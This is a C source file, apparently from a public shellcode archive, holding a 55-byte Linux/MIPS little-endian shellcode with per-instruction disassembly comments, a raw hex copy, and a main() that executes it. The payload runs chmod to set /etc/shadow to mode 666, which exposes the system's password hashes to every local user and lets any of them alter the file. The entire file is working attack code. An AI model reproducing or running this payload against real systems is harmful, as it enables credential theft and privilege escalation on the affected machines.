#include <stdio.h>

/*
	Title: Linux/MIPS (Little Endian) - chmod 666 /etc/shadow - 55 bytes
	Date: 2015-03-05
	Author: Sang-Min LEE
	Email: leesangmin144@gmail.com
	Blog: http://smleenull.tistory.com
*/

char sc[] = {
	"\xff\xff\x06\x28" // slti $a2, $zero, -1
	"\xff\xff\xd0\x04" // bltzal $a2, p <p>
	"\xff\xff\x05\x28" // slti $a1, $zero, -1
	"\xb6\x01\x05\x24" // li $a1, 438
	"\x01\x10\xe4\x27" // addu $a0, $ra, 4097
	"\x1f\xf0\x84\x24" // addu $a0, $a0, -4065
	"\xaf\x0f\x02\x24" // li $v0, 4015
	"\x0c\x01\x01\x01" // syscall 0x40404
	"\xff\xff\x04\x28" // slti $a0, $zero, -1
	"\xa1\x0f\x02\x24" // li $v0, 4001
	"\x0c\x01\x01\x01" // syscall 0x40404
	"/etc/shadow"
};

/*
Shellcode
\xff\xff\x06\x28\xff\xff\xd0\x04\xff\xff\x05\x28\xb6\x01\x05\x24\x01\x10\xe4\x27\x1f\xf0\x84\x24\xaf\x0f\x02\x24\x0c\x01\x01\x01\xff\xff\x04\x28\xa1\x0f\x02\x24\x0c\x01\x01\x01\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77
*/

void main ()
{
	void (*s)(void);
	printf("sc size %d\n", sizeof(sc));
	s = sc;
	s();
}